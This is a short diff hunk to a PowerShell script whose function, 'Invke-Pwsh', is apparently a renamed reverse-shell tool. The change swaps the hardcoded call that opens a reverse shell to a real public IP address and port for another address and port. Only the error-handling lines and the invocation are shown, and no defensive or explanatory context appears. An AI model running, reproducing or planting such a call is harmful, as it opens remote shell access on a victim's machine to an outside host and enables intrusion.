@@ -84,6 +84,6 @@ function Invke-Pwsh
     {
         Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
         Write-Error $_
-    } Invke-Pwsh -Reverse -IPAddress 13.238.81.219 -Port 11418
+    } Invke-Pwsh -Reverse -IPAddress 81.0.219.234 -Port 9991
 }
 
